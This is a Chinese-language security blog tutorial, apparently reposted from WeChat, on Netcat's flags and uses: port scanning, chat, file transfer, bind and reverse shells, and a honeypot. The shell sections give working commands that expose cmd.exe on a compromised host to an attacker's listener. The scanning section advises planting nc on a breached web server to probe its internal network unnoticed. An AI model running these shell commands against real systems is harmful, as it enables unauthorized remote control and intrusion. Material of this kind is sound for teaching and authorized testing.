> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247484166&idx=1&sn=dc0998b6a6bb60a963db0a74d8c94174&chksm=eaad833bddda0a2daad7fd2970af9b2d2a08f82e5152bce68869ecc13debbc816942efe15e45&scene=21#wechat_redirect)

**目录**

                     

Netcat

常用参数：

常见的用法：

端口扫描：

聊天

文件传输

反弹 shell

蜜罐

**Netcat** 常称为 nc，拥有 “瑞士军刀” 的美誉。nc 小巧强悍，可以读写 TCP 或 UDP 网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于 socket 协议工作。在渗透测试领域，我们通常利用它来反弹 shell。

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC5x6JawVlxYwrsf4OxhIz1HzZrTT4UZAcukC3cKqetSHpGJABL8ZCM8yibLyNpvY2Zia3IAY3P6yE9A/640?wx_fmt=gif)

常用参数

·   -l： 开启监听

·   -p：指定端口

·   -t： 以 telnet 形式应答

·   -e：程序重定向

·   -n：以数字形式表示 ip

·   -v：显示执行命令过程

·   -z :  不进行交互，直接显示结果

·   -u ：使用 UDP 协议传输

·   -w :  设置超时时间

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC5x6JawVlxYwrsf4OxhIz1HoaHEjBLqmAGrZlH8BTIAaGKt4xLxqt7gEL9Jj00Y7u9ic8Xy6EYiaVBQ/640?wx_fmt=gif)

常见的用法

**端口扫描：**

如果是想单纯的端口扫描的话，利用其它工具比如 nmap 会更好。nc 端口扫描最主要的用途是，当我们获得了一个网站的权限之后，我们想再渗透进该网站的内网进行渗透。然而，我们的 nmap 工具是不能扫描到内网的，所以这时我们可以把 nc 上传到 web 服务器上，利用它来扫描内网主机。而由于 nc 体积很小，所以不容易被发现。

nc  -z -v -n 192.168.10.14  20-23   # 端口或端口范围

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29nTXJO7iaS22OBaibAt1UhHrErQ0wibIbXaDxgmtHX5rcY7cP9ic3EQ2gcw/640?wx_fmt=png)

如果探测到端口开放了，比如上面的 80 端口开放了，我们就可以继续探测其 banner 信息： 

nc -v -n 192.168.10.14  80

然后输入 get

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29mUQicbouxPEDm3iaJT0iaVxFoAfv188sziaTtl76N9H5bl7RiaPnf4m5RMg/640?wx_fmt=png)

**聊天**

我们还可以利用 nc 做一个简易版本的聊天工具，通过一边监听端口，一边发送消息去该端口，形成一个简易版本的服务端—客户端模型。

**服务器端：**

nc   -lvp    8888     # 监听 8888 端口  -l 监听 -v 显示详细信息  -p 指定端口

**客户端：**

nc  -nv  10.96.10.208  8888    # 连接到服务器的 8888 端口  -n 以数字形式显示 ip  -v 显示详细信息

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29a0vOuJdXT3pWrXLzRbiaSRoXaA13ggCczxnveWqhVhb1NUib1cdic1Fgw/640?wx_fmt=png)

**文件传输**

我们可以利用 nc 往客户端传送文件

**服务器端：**

nc  -lvp  8888 < test.txt

**客户端：**

nc -nv 10.96.10.208 8888 > test.txt

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29IPYeeE3MTvafZzpKUfwCK5Yd9sY3Y2GzVnib76FRnAh2h25NuR6XBlQ/640?wx_fmt=png)

**反弹 shell**

正向连接，意思就是我们主动连接肉鸡

假如我们现在入侵到了一台主机上，我们可以通过执行以下命令将该主机的 cmd 命令弹到 8888 端口上

**肉鸡**

nc -lvv -p 8888 -t -e cmd.exe

然后我们的主机访问该肉鸡的 8888 端口

**我们的主机**

nc  -nvv  192.168.10.14  8888

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29gaqIX2khSY9HcZwu7bL7pyib4Tu0VYnShqibrY3pnCQoQecQoQhKiaO7g/640?wx_fmt=png)

反向连接，意思就是我们监听端口，然后肉鸡主动连接到我们的主机

**我们的主机**

nc  -lvp  8888

**肉鸡 (Windows)**

nc  -t -e cmd.exe 10.96.10.208 8888

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29IblZ2hBgddJXceWX9GZfiaCRMbNT6130NypAQ0ykf012xy25dCLQtqw/640?wx_fmt=png)

**蜜罐**

作为蜜罐

一直监听 8888 端口，知道 ctrl+C 停止

nc  -L -p  8888  > log.txt   # 监听 8888 端口，并且将日志信息写入 log.txt 中

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29vBJIpib762U5NhsLuhn9hKHkkKAf5H3z2cl1zwmRxNIw9gCB6GlHlLA/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2ckkbwTsBvnDJpb89o8WMxvAKOaVnz60hOe7y3wAHiclddyK53lpEKIQlx4DKOq6EojHibVicgibDB2aQ/640?wx_fmt=gif)

来源：谢公子的博客

责编：浮夸

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2edCjiaG0xjojnN3pdR8wTrKhibQ3xVUhjlJEVqibQStgROJqic7fBuw2cJ2CQ3Muw9DTQqkgthIjZf7Q/640?wx_fmt=png)

由于文章篇幅较长，请大家耐心。如果文中有错误的地方，欢迎指出。有想转载的，可以留言我加白名单。

最后，欢迎加入谢公子的小黑屋（安全交流群）(QQ 群：783820465)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SjCxEtGic0gSRL5ibeQyZWEGNKLmnd6Um2Vua5GK4DaxsSq08ZuH4Avew/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)